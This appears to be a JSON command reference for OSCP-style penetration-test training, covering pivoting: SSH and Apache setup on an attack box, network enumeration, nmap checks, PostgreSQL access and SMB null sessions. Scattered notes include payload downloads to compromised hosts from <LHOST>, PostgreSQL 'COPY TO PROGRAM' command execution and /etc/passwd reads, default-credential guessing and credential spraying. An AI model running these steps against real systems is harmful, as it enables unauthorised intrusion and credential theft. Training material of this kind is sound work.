{
  "category": "pivoting",
  "commands": [
    {
      "id": "systemctl-start-ssh",
      "name": "Start SSH Server via Systemd",
      "category": "pivoting",
      "subcategory": "ssh-tunneling",
      "command": "sudo systemctl start ssh",
      "description": "Start OpenSSH server using systemd - required for receiving SSH tunnels from compromised hosts",
      "tags": [
        "SSH",
        "SERVER",
        "SYSTEMD",
        "OSCP:HIGH",
        "PIVOTING"
      ],
      "variables": [],
      "flag_explanations": {
        "sudo": "Root privileges required to manage system services",
        "systemctl": "Systemd service manager - controls service lifecycle",
        "start": "Start service immediately (does not enable at boot)",
        "ssh": "Service name for OpenSSH server daemon (sshd)"
      },
      "success_indicators": [
        "Service starts silently (no output = success)",
        "Verify with: sudo systemctl status ssh → Active: active (running)",
        "Port listening: ss -ntplu | grep :22",
        "Process running: ps aux | grep sshd"
      ],
      "failure_indicators": [
        "Failed to start ssh.service - SSH server not installed",
        "Job for ssh.service failed - port 22 already in use",
        "Address already in use - another SSH server running on port 22"
      ],
      "next_steps": [],
      "alternatives": [
        "service-ssh-start-sysvinit"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Unit ssh.service not found": "Install OpenSSH server: sudo apt install openssh-server -y",
        "Port 22 already in use": "Check for existing SSH server: sudo lsof -i :22, kill if needed: sudo kill <PID>",
        "Failed to bind port 22: Permission denied": "Requires sudo - port <1024 needs root privileges",
        "Service failed to start": "Check logs: sudo journalctl -u ssh -xe, look for config errors in /etc/ssh/sshd_config"
      },
      "notes": "Critical OSCP technique:\nStart SSH server on attack machine to receive reverse SSH tunnels from compromised Windows/Linux hosts.\n\nPlink (Windows) and ssh (Linux) can connect back to this server to establish port forwarding.\n\nDefault Kali:\nSSH server pre-installed but not started.\n\nAlways verify PasswordAuthentication yes in sshd_config if using passwords (keys preferred for OPSEC).\n\nUse systemctl enable ssh to start at boot (optional).\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse key authentication only, disable password auth.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Verify SSH server listening: ss -ntplu | grep :22 Check SSH server status: sudo systemctl status ssh Test local connection: ssh localhost Configure password authentication if needed: sudo nano /etc/ssh/sshd_config → PasswordAuthentication yes Reload config after changes: sudo systemctl reload ssh Set up port forwarding from compromised host: plink-remote-forward or ssh-remote-dynamic-port-forward"
      }
    },
    {
      "id": "apache2-start",
      "name": "Start Apache Web Server",
      "category": "pivoting",
      "subcategory": "file-transfer",
      "command": "sudo systemctl start apache2",
      "description": "Start Apache HTTP server - serve files from /var/www/html for file transfer to compromised hosts",
      "tags": [
        "APACHE",
        "HTTP_SERVER",
        "FILE_TRANSFER",
        "OSCP:HIGH",
        "SYSTEMD"
      ],
      "variables": [],
      "flag_explanations": {
        "sudo": "Root privileges required to manage system services and bind port 80",
        "systemctl": "Systemd service manager",
        "start": "Start service immediately (does not persist after reboot unless enabled)",
        "apache2": "Service name for Apache HTTP server"
      },
      "success_indicators": [
        "Service starts silently (no output = success)",
        "Verify with: sudo systemctl status apache2 → Active: active (running)",
        "Port listening: ss -ntplu | grep :80",
        "Test from browser: http://localhost or curl http://localhost → Apache default page",
        "File access from compromised host: wget http://<LHOST>/payload.exe or certutil -urlcache -f http://<LHOST>/winPEASx64.exe"
      ],
      "failure_indicators": [
        "Failed to start apache2.service - Apache not installed",
        "Address already in use - port 80 occupied by another service",
        "Job for apache2.service failed - check configuration errors"
      ],
      "next_steps": ["ss-listening-ports", "ip-addr"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "Unit apache2.service not found": "Install Apache: sudo apt install apache2 -y",
        "Port 80 already in use": "Check process: sudo lsof -i :80, stop conflicting service (e.g., sudo systemctl stop nginx), or use alternate port in /etc/apache2/ports.conf",
        "403 Forbidden when accessing file": "Fix permissions: sudo chmod 644 /var/www/html/file, ensure directory traversal allowed in Apache config",
        "Target cannot reach server": "Verify LHOST routing: ip addr show tun0, test with: curl http://<LHOST> from another machine"
      },
      "notes": "Essential OSCP file transfer technique:\nServe exploits, payloads, enumeration scripts to compromised hosts.\n\nDefault web root:\n/var/www/html/.\n\nCommon pattern:\ncp LinEnum.sh /var/www/html/ → wget http://<LHOST>/LinEnum.sh on target.\n\nAdvantages over Python HTTP server:\nService management, logging, performance.\n\nDisadvantage:\nRequires root for port 80.\n\nAlternative:\npython3 -m http.server 8000 runs unprivileged on port 8000.\n\nAlways monitor /var/log/apache2/access.log to confirm target downloaded file.\n\nTime estimate:\n30 seconds.\n\nProduction:\nUse TLS, authentication, non-standard ports.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Verify web server: curl http://localhost Place files in web root: cp exploit.sh /var/www/html/ Serve custom directory: sudo ln -s /path/to/tools /var/www/html/tools Download from target: wget http://<LHOST>/exploit.sh or Invoke-WebRequest http://<LHOST>/nc.exe -OutFile nc.exe Monitor access logs: sudo tail -f /var/log/apache2/access.log",
        "time_estimate": "Alternative: python3 -m http.server 8000 for quick non-root server"
      }
    },
    {
      "id": "ss-listening-ports",
      "name": "Display Listening Ports (ss)",
      "category": "pivoting",
      "subcategory": "enumeration",
      "command": "ss -ntplu",
      "description": "Display all listening TCP/UDP ports with process information - verify SSH/HTTP servers started and port forwards active",
      "tags": [
        "ENUMERATION",
        "NETWORKING",
        "PORT_SCAN",
        "OSCP:HIGH",
        "SS"
      ],
      "variables": [],
      "flag_explanations": {
        "-n": "Numeric output - show IP addresses and ports as numbers (no DNS resolution)",
        "-t": "Show TCP sockets only",
        "-p": "Show process using each socket (PID and program name)",
        "-l": "Show only listening sockets (servers waiting for connections)",
        "-u": "Show UDP sockets (combined with -t to show both TCP and UDP)"
      },
      "success_indicators": [
        "Output shows listening ports with process names",
        "SSH server: 0.0.0.0:22 users:((\"sshd\",pid=1234,fd=3))",
        "Apache server: 0.0.0.0:80 users:((\"apache2\",pid=5678,fd=4))",
        "Port forward: 127.0.0.1:9833 users:((\"ssh\",pid=9999,fd=5))"
      ],
      "failure_indicators": [
        "Empty output - no listening services",
        "ss: command not found - iproute2 not installed (use netstat -ntplu alternative)"
      ],
      "next_steps": [],
      "alternatives": [
        "nmap-localhost-verification"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "ss: command not found": "Install iproute2: sudo apt install iproute2, or use netstat alternative: netstat -ntplu",
        "Process column empty": "Run with sudo: sudo ss -ntplu to see process information for all sockets",
        "Expected port not listed": "Service not running - check with: sudo systemctl status <service>, start if needed",
        "Port shows LISTEN but connection fails": "Firewall blocking - check: sudo ufw status or sudo iptables -L -n"
      },
      "notes": "Critical OSCP verification command:\nConfirm SSH/Apache/port forwards are listening before attempting connections.\n\nModern replacement for netstat (faster, part of iproute2).\n\nCommon workflow:\nStart service → ss -ntplu | grep :<PORT> → Verify process name matches.\n\nPort forward debugging:\nCheck for 127.0.0.1:<REMOTE_PORT> entry to confirm tunnel established.\n\nProcess column shows which service owns each port - essential for troubleshooting port conflicts.\n\nOutput format:\nState Recv-Q Send-Q Local_Address:Port Peer_Address:Port Process.\n\nTime estimate:\n5 seconds.\n\nAlias tip:\nalias ports='ss -ntplu' for quick access.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Verify expected services: grep ':22\\|:80\\|:443' to find SSH/HTTP/HTTPS Identify port forwards: grep '127.0.0.1' to find local tunnels Check for conflicts: If starting service fails, use ss -ntplu | grep :<PORT> to find occupying process Kill conflicting process: sudo kill <PID> or sudo systemctl stop <service> Monitor for new connections: watch -n 1 'ss -ntplu' for real-time updates"
      }
    },
    {
      "id": "ip-addr",
      "name": "Display Network Interfaces",
      "category": "pivoting",
      "subcategory": "enumeration",
      "command": "ip addr",
      "description": "Display all network interfaces and assigned IP addresses - identify LHOST for reverse shells and tunnels",
      "tags": [
        "ENUMERATION",
        "NETWORKING",
        "IP_ADDRESS",
        "OSCP:HIGH",
        "IPROUTE2"
      ],
      "variables": [],
      "flag_explanations": {
        "ip": "iproute2 command - modern networking utility",
        "addr": "Address management - show/manipulate IP addresses (can also use 'ip a' shorthand)"
      },
      "success_indicators": [
        "Output shows interface names (eth0, tun0, wlan0)",
        "Each interface lists IP addresses: inet <IP>/CIDR",
        "VPN interface visible: tun0 or tap0 with OSCP lab IP (10.x.x.x)",
        "Local interface: lo with 127.0.0.1/8",
        "Ethernet/WiFi: eth0/wlan0 with LAN IP (192.168.x.x)"
      ],
      "failure_indicators": [
        "ip: command not found - iproute2 not installed (use ifconfig alternative)",
        "No VPN interface (tun0/tap0) - VPN not connected"
      ],
      "next_steps": ["ssh-remote-port-forward", "apache2-start", "ip-route"],
      "alternatives": [],
      "prerequisites": [],
      "troubleshooting": {
        "ip: command not found": "Install iproute2: sudo apt install iproute2, or use ifconfig alternative",
        "tun0 interface missing": "VPN not connected - start OpenVPN: sudo openvpn lab.ovpn",
        "Interface DOWN": "Bring up interface: sudo ip link set <interface> up",
        "No IP assigned": "Request DHCP: sudo dhclient <interface> or assign static: sudo ip addr add <IP>/24 dev <interface>"
      },
      "notes": "Essential OSCP command:\nDetermine LHOST value for reverse shells and SSH tunnels.\n\nModern replacement for ifconfig.\n\nCommon pattern:\nVPN connects → ip addr show tun0 → Note IP → Use in exploit payloads.\n\nInterface states:\nUP/DOWN in output.\n\nIP format:\ninet <IP>/<CIDR> brd <broadcast>.\n\nIPv6 addresses shown as inet6.\n\nShorthand:\nip a (same as ip addr).\n\nOutput includes:\nLink layer (MAC), IP layer (addresses), interface state (UP/DOWN/UNKNOWN).\n\nTime estimate:\n5 seconds.\n\nOSCP critical:\nAlways verify tun0 IP before starting engagement.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Identify LHOST for reverse shells: Look for tun0 IP → Use in bash-reverse-shell, nc-reverse-shell Extract IP programmatically: ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 Set LHOST in config: crack reference --set LHOST <IP> Verify routing: ip route to see which interface is default gateway Check connectivity: ping <TARGET> -I tun0 to test VPN routing"
      }
    },
    {
      "id": "ip-route",
      "name": "Display Routing Table",
      "category": "pivoting",
      "subcategory": "enumeration",
      "command": "ip route",
      "description": "Display kernel routing table - verify VPN routes and identify network topology for pivoting",
      "tags": [
        "ENUMERATION",
        "NETWORKING",
        "ROUTING",
        "OSCP:MEDIUM",
        "IPROUTE2"
      ],
      "variables": [],
      "flag_explanations": {
        "ip": "iproute2 command - modern networking utility",
        "route": "Routing table management - show/manipulate kernel routing table (can also use 'ip r' shorthand)"
      },
      "success_indicators": [
        "Output shows routing entries with destination networks",
        "Default route: default via <gateway_ip> dev <interface>",
        "VPN routes: 10.x.x.x/24 dev tun0 proto kernel scope link",
        "Local network: 192.168.x.0/24 dev eth0 proto kernel scope link",
        "Lab subnets: Multiple 10.x.x.0/24 entries for OSCP network segments"
      ],
      "failure_indicators": [
        "ip: command not found - iproute2 not installed",
        "No default route - no internet connectivity",
        "Missing tun0 routes - VPN not properly configured"
      ],
      "next_steps": [],
      "alternatives": [
        "netstat-routing-table"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "ip: command not found": "Install iproute2: sudo apt install iproute2, or use route -n alternative",
        "No default route": "Add default route: sudo ip route add default via <gateway_ip> dev <interface>",
        "Duplicate routes": "Delete old route: sudo ip route del <destination> via <old_gateway>, then add correct route",
        "Cannot reach target network": "Check routing table, add static route if needed, verify firewall rules"
      },
      "notes": "Important OSCP enumeration:\nUnderstanding routing helps identify network topology and multi-homed pivot points.\n\nModern replacement for route -n.\n\nOutput format:\n<destination> via <gateway> dev <interface> [proto <protocol>] [metric <priority>].\n\nScope link means directly connected network (no gateway).\n\nProto kernel means automatically added by kernel.\n\nPivoting use case:\nOn compromised host, ip route reveals other network segments accessible from that host - indicates potential pivot paths.\n\nTime estimate:\n5 seconds.\n\nProduction:\nStatic routes persist with /etc/network/interfaces or NetworkManager.",
      "oscp_relevance": "medium",
      "methodology_guidance": {
        "oscp_tips": "Verify VPN routing: Check for tun0 entries with OSCP lab subnets (10.x.x.0/24)",
        "after_success": "Identify default gateway: Look for 'default via' entry - determines internet routing Check route conflicts: Multiple routes to same network may cause issues Test connectivity: ping <TARGET> and traceroute <TARGET> to verify routing Add static route if needed: sudo ip route add <subnet>/24 via <gateway> dev <interface> Pivoting: Identify multi-homed hosts by checking routing table on compromised machine"
      }
    },
    {
      "id": "nmap-port-check",
      "name": "Quick Port Verification (Nmap)",
      "category": "pivoting",
      "subcategory": "enumeration",
      "command": "sudo nmap -p <PORT> -Pn -v <TARGET>",
      "description": "Verify specific port is open and reachable - confirm SSH/HTTP server started or port forward active",
      "tags": [
        "NMAP",
        "PORT_SCAN",
        "ENUMERATION",
        "OSCP:HIGH",
        "VERIFICATION"
      ],
      "variables": [
        {
          "name": "<PORT>",
          "description": "Port number to check",
          "example": "22",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address or hostname",
          "example": "192.168.45.100",
          "required": true
        }
      ],
      "flag_explanations": {
        "sudo": "Root privileges required for raw socket access and accurate service detection",
        "-p": "Port specification - can be single port (22), range (1-1000), or list (22,80,443)",
        "-Pn": "Skip host discovery (no ping) - treat host as alive, essential for firewalled hosts",
        "-v": "Verbose output - show progress and detailed results during scan"
      },
      "success_indicators": [
        "PORT STATE SERVICE",
        "<PORT>/tcp open <service_name>",
        "Nmap done: 1 IP address (1 host up) scanned",
        "Service version detected if port open"
      ],
      "failure_indicators": [
        "<PORT>/tcp filtered <service> - firewall blocking",
        "<PORT>/tcp closed <service> - port not listening",
        "All 1 scanned ports are filtered - host may be down or firewall blocking",
        "Note: Host seems down - port unreachable despite -Pn"
      ],
      "next_steps": [],
      "alternatives": [
        "curl-http-service-verification"
      ],
      "prerequisites": [],
      "troubleshooting": {
        "Connection timed out": "Firewall blocking, verify network path with: traceroute <TARGET>, check local firewall: sudo iptables -L -n",
        "Port filtered consistently": "Host-based firewall active - may need to adjust rules on target or use alternative port",
        "Nmap scan very slow": "Add -T4 for faster timing (less stealthy): sudo nmap -p <PORT> -Pn -v -T4 <TARGET>",
        "Permission denied without sudo": "Raw socket operations require root - always use sudo for accurate results"
      },
      "notes": "Critical OSCP verification technique:\nConfirm services started before attempting connections.\n\nUse cases:\n1) Verify SSH server listening after systemctl start ssh, 2) Confirm port forward active after Plink/SSH tunnel, 3) Check HTTP server before wget from target, 4) Validate RDP access before xfreerdp.\n\nAlways use -Pn flag to skip ping (OSCP hosts often block ICMP).\n\nVerbose (-v) provides progress feedback during scan.\n\nFast alternative for localhost:\nnc -zv localhost <PORT>.\n\nTime estimate:\n2-5 seconds per port.\n\nProduction:\nUse -sV for version detection, --script for vulnerability scanning.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "If open: Proceed with service connection (ssh, xfreerdp, psql, smbclient) If closed: Verify service running on target (ss -ntplu), start service if needed If checking port forward: Scan 127.0.0.1:<PORT> on SSH server to verify tunnel Version detection: Add -sV flag for detailed service version: sudo nmap -p <PORT> -Pn -v -sV <TARGET> Service enumeration: Use service-specific Nmap scripts: sudo nmap -p <PORT> -Pn -v --script=<script_name> <TARGET>",
        "on_failure": "If filtered: Check firewall rules on target, verify network routing, try alternative port"
      }
    },
    {
      "id": "psql-connect",
      "name": "PostgreSQL Client Connection",
      "category": "pivoting",
      "subcategory": "database-access",
      "command": "psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>",
      "description": "Connect to PostgreSQL database server - enumerate databases, tables, and extract credentials after pivoting",
      "tags": [
        "POSTGRESQL",
        "DATABASE",
        "ENUMERATION",
        "PIVOTING",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "PostgreSQL server IP address or hostname",
          "example": "10.4.50.215",
          "required": true
        },
        {
          "name": "<PORT>",
          "description": "PostgreSQL port (default 5432)",
          "example": "5432",
          "required": false
        },
        {
          "name": "<USERNAME>",
          "description": "Database username for authentication",
          "example": "postgres",
          "required": true
        },
        {
          "name": "<DATABASE>",
          "description": "Database name to connect to (default: postgres)",
          "example": "postgres",
          "required": false
        }
      ],
      "flag_explanations": {
        "-h": "Host - PostgreSQL server IP address or hostname",
        "-p": "Port - PostgreSQL service port (default 5432 if omitted)",
        "-U": "Username - database user for authentication",
        "-d": "Database - specific database to connect to (default: postgres)",
        "-W": "(Optional) Force password prompt - useful if password not in .pgpass",
        "-c": "(Optional) Execute single command and exit - e.g., psql -h <HOST> -U <USER> -c 'SELECT version();'"
      },
      "success_indicators": [
        "psql prompt appears: postgres=#",
        "Can execute queries: \\l (list databases), \\dt (list tables), SELECT * FROM users;",
        "Version banner displayed: PostgreSQL <version> on <architecture>",
        "No authentication errors"
      ],
      "failure_indicators": [
        "psql: error: connection to server failed: Connection refused - service not running or firewall blocking",
        "FATAL: password authentication failed for user - wrong credentials",
        "FATAL: database \"<name>\" does not exist - invalid database name",
        "psql: error: could not connect to server: No route to host - networking issue"
      ],
      "next_steps": [],
      "alternatives": [],
      "prerequisites": ["nmap-service-scan", "ssh-local-port-forward"],
      "troubleshooting": {
        "Connection refused": "Verify PostgreSQL running: sudo nmap -p <PORT> -Pn -v <TARGET>, check postgresql.conf for listen_addresses, verify pg_hba.conf allows remote connections",
        "Password authentication failed": "Check credentials, try default postgres:postgres, use -W to force password prompt",
        "Database does not exist": "Connect to default database: psql -h <TARGET> -U postgres (omit -d flag), then list databases with \\l",
        "psql: command not found": "Install PostgreSQL client: sudo apt install postgresql-client -y",
        "SSL connection error": "Disable SSL: psql -h <TARGET> -U <USER> -d <DB> sslmode=disable",
        "No route to host": "Set up port forward if database is internal: ssh -L 5432:<TARGET>:5432 pivot_user@pivot_host, then psql -h 127.0.0.1"
      },
      "notes": "Critical OSCP database enumeration technique:\nExtract credentials, application data, and potentially execute commands with superuser privileges.\n\nCommon pivoting pattern:\nPort scan reveals 5432 internal → SSH local port forward → psql to 127.0.0.1 → Dump credentials.\n\nPostgreSQL superuser capabilities:\nCOPY TO PROGRAM for command execution (9.3+), COPY FROM for file reading, CREATE EXTENSION for loading malicious libraries.\n\nMetafile commands:\n\\l (databases), \\dt (tables), \\du (users), \\d <table> (describe), \\c <db> (switch database), \\q (quit).\n\nDefault credentials to try:\npostgres:postgres, postgres:<blank>, admin:admin.\n\nTime estimate:\n1-2 minutes for initial enumeration.\n\nProduction:\nAlways use SSL, restrict pg_hba.conf, disable superuser remote access.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "List all databases: \\l or SELECT datname FROM pg_database; Switch database: \\c <database_name> List tables in current database: \\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; Describe table structure: \\d <table_name> Extract credentials: SELECT username,password FROM users; (look for password hashes) Check user privileges: SELECT * FROM pg_user; or \\du Command execution if superuser: COPY (SELECT '') TO PROGRAM 'id'; (PostgreSQL 9.3+) Read files if superuser: CREATE TABLE pwn(t TEXT); COPY pwn FROM '/etc/passwd'; Exit: \\q or Ctrl+D"
      }
    },
    {
      "id": "smbclient-list-shares",
      "name": "SMB Share Enumeration (No Auth)",
      "category": "pivoting",
      "subcategory": "smb-enumeration",
      "command": "smbclient -N -L //<TARGET>",
      "description": "List SMB shares without authentication (null session) - discover accessible shares for file enumeration",
      "tags": [
        "SMB",
        "ENUMERATION",
        "NULL_SESSION",
        "OSCP:HIGH",
        "SMBCLIENT"
      ],
      "variables": [
        {
          "name": "<TARGET>",
          "description": "SMB server IP address or hostname",
          "example": "192.168.50.63",
          "required": true
        }
      ],
      "flag_explanations": {
        "-N": "No password - attempt null session (anonymous login without credentials)",
        "-L": "List shares - display available shares on target server",
        "//": "UNC path prefix - standard SMB notation for network paths"
      },
      "success_indicators": [
        "Sharename       Type      Comment",
        "List of shares displayed (ADMIN$, C$, IPC$, custom shares)",
        "IPC$ share present - indicates null session allowed",
        "Readable shares listed - potential for anonymous access"
      ],
      "failure_indicators": [
        "NT_STATUS_ACCESS_DENIED - null sessions disabled (common on Windows 10/2019+)",
        "NT_STATUS_IO_TIMEOUT - SMB service not running or firewall blocking",
        "Connection to <TARGET> failed - host unreachable or wrong IP",
        "session setup failed: NT_STATUS_LOGON_FAILURE - null session not permitted"
      ],
      "next_steps": ["smbclient-connect", "enum4linux-smb", "smbmap-shares"],
      "alternatives": ["enum4linux-smb", "smbmap-shares"],
      "prerequisites": ["nmap-service-scan"],
      "troubleshooting": {
        "NT_STATUS_ACCESS_DENIED": "Null sessions disabled - try authenticated access with -U flag, or enumerate users first: enum4linux -U <TARGET>",
        "Connection timeout": "Verify SMB port open: sudo nmap -p 445 -Pn -v <TARGET>, check for firewall blocking port 445",
        "smbclient: command not found": "Install Samba client: sudo apt install smbclient -y",
        "Protocol negotiation failed": "SMBv1 disabled - force SMB2: smbclient -N -L //<TARGET> --option='client min protocol=SMB2'",
        "Unable to initialize messaging context": "Non-critical warning - ignore if shares still listed"
      },
      "notes": "Essential OSCP SMB enumeration technique:\nNull sessions reveal share names without credentials - often exposes sensitive files, backup configs, or writable directories for payload upload.\n\nNull sessions common on:\nWindows 2000/XP/2003, misconfigured Windows 7/2008.\n\nModern Windows (10/2019+) disables null sessions by default.\n\nCommon share names:\nADMIN$ (C:\\Windows), C$ (C:\\), IPC$ (inter-process communication), NETLOGON, SYSVOL (domain controllers), Users, Backups, Public.\n\nWritable share use case:\nUpload malicious file → Execute via RCE vulnerability.\n\nTime estimate:\n5-10 seconds.\n\nProduction:\nAlways disable null sessions, restrict share permissions, use SMB signing.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "If shares listed: Attempt anonymous access: smbclient -N //<TARGET>/<SHARE_NAME> Enumerate share contents: ls, get <file>, mget * (download all files) Check for writable shares: cd into share, attempt: put test.txt If access denied: Try authenticated access: smbclient -U <USERNAME> //<TARGET>/<SHARE_NAME> Alternative enumeration: enum4linux -a <TARGET> for comprehensive SMB enumeration Credential spraying: crackmapexec smb <TARGET> -u users.txt -p passwords.txt --shares Mount share for easier access: sudo mount -t cifs //<TARGET>/<SHARE> /mnt/smb -o username=,password="
      }
    }
  ]
}
